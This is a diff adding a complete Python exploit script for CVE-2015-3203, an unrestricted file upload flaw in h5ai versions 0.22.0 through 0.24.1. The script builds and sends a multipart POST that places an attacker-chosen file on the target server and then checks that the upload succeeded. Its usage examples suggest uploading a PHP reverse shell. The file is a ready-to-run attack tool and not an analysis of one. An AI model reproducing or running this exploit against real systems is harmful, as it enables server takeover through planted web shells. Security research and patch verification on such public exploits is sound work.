@@ -1,0 +1,161 @@
+#!/usr/bin/env python
+
+# Exploit Title: h5ai < 0.25.0 Unrestricted File Upload
+# Date: 21 September 2015
+# Exploit Author: rTheory
+# Vendor Homepage: https://larsjung.de/h5ai/
+# Vulnerable Software Link: https://web.archive.org/web/20140208063613/http://release.larsjung.de/h5ai/h5ai-0.24.0.zip
+# Vulnerable Versions: 0.22.0 - 0.24.1
+# Tested on: 0.24.0 running on Apache
+# CVE : 2015-3203
+
+import urllib
+import urllib2
+import socket
+import os
+import getopt
+import sys
+
+# Globals with default options
+url = ''
+path = '/'
+fileName = ''
+filePath = ''
+verboseMode = False
+
+def header():
+    print '+-----------------------------------------------+'
+    print '| File upload exploit for h5ai v0.22.0 - 0.24.1 |'
+    print '|  See CVE-2015-3203 for vulnerability details  |'
+    print '+------------------- rTheory -------------------+'
+
+def usage():
+    print 
+    print 'Usage: %s -t target_url -f upload_file' % os.path.basename(__file__)
+    print '-t --target           - The URL to connect to'
+    print '                        ex: http://example.com'
+    print '-f --file             - The file to upload'
+    print '                        ex: php-reverse-shell.php'
+    print '-p --path             - The path to upload to'
+    print '                        Default is \'/\''
+    print '-v --verbose          - Enable more verbose output'
+    print 
+    print 'Examples:'
+    print '%s -t http://example.com:8080 -f php-reverse-shell.php' % os.path.basename(__file__)
+    print '%s -t http://192.168.1.100 -f php-reverse-shell.php -p /dir/' % os.path.basename(__file__)
+    sys.exit(0)
+    
+def main():
+    global url
+    global path
+    global fileName
+    global filePath
+    global verboseMode
+    
+    header()
+    
+    if not len(sys.argv[4:]):
+        print '[-] Incorrect number of arguments'
+        usage()
+        
+    try:
+        opts, args = getopt.getopt(sys.argv[1:],"ht:f:p:v", ["help","target","file","path","verbose"])
+    except getopt.GetoptError as err:
+        print str(err)
+        usage()
+
+    for o,a in opts:
+        if o in ('-h','--help'):
+            usage()
+        elif o in ('-t','--target'):
+            url = a
+        elif o in ('-f','--file'):
+            fileName = a
+        elif o in ('-p','--path'):
+            path = a
+        elif o in ('-v','--verbose'):
+            verboseMode = True
+        else:
+            assert False,"Unhandled Option"
+        
+    # Test target URL, target file, and path inputs for validity
+    if not url.startswith('http'):
+        print '[-] Error: Target URL must start with http:// or https://'
+        usage()
+    if not os.path.isfile(fileName):
+        print '[-] Error: File does not appear to exist'
+        usage()
+    if not (path.startswith('/') and path.endswith('/')):
+        print '[-] Error: Path must start and end with a \'/\''
+        usage()
+    
+    # Determine target host, which is the URL minus the leading protocol
+    if url.find('http://') != -1:
+        host = url[7:]
+    elif url.find('https://') != -1:
+        host = url[8:]
+    else:
+        host = url
+    
+    # Store the contents of the upload file into a string
+    print '[+] Reading upload file'
+    f = open(fileName,'r')
+    fileContents = f.read()
+    f.close()
+    
+    MPFB = 'multipartformboundary1442784669030' # constant string used for MIME info
+
+    # Header information. Content-Length not needed.
+    http_header = {
+        "Host" : host,
+        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
+        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language" : "en-us,en;q=0.5",
+        "Accept-Encoding" : "gzip, deflate",
+        "Content-type" : "multipart/form-data; boundary=------" + MPFB,
+        "X-Requested-With" : "XMLHttpRequest",
+        "Referer" : url + path, 
+        "Connection" : "keep-alive"
+    }
+
+    # POST parameter for file upload
+    payload  = '--------'+MPFB+'\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload\r\n'
+    payload += '--------'+MPFB+'\r\nContent-Disposition: form-data; name="href"\r\n\r\n'+path+'\r\n'
+    payload += '--------'+MPFB+'\r\nContent-Disposition: form-data; name="userfile"; filename="'+fileName+'"\r\nContent-Type: \r\n\r\n'+fileContents+'\r\n'
+    payload += '--------'+MPFB+'--\r\n'
+
+    socket.setdefaulttimeout(5)
+    opener = urllib2.build_opener()
+    req = urllib2.Request(url, payload, http_header)
+
+    # submit request and print output. Expected: "code 0"
+    try:
+        print '[+] Sending exploit POST request'
+        res = opener.open(req)
+        html = res.read()
+        if verboseMode: print '[+] Server returned: ' + html
+    except:
+        print '[-] Socket timed out, but it might still have worked...'
+
+    # close the connection
+    opener.close()
+
+    # Last step: check to see if the file uploaded (performed outside of this function)
+    filePath = url + path + fileName
+    print '[+] Checking to see if the file uploaded:'
+    print '[+] ' + filePath 
+
+def postCheck():
+    # Check to see if the file exists
+    # This may work now that everything from main() was torn down
+    global filePath
+    try:
+        urllib2.urlopen(filePath)
+        print '[+] File uploaded successfully!'
+    except urllib2.HTTPError, e:
+        print '[-] File did not appear to upload'
+    except urllib2.URLError, e:
+        print '[-] File did not appear to upload'
+    
+main()
+postCheck()
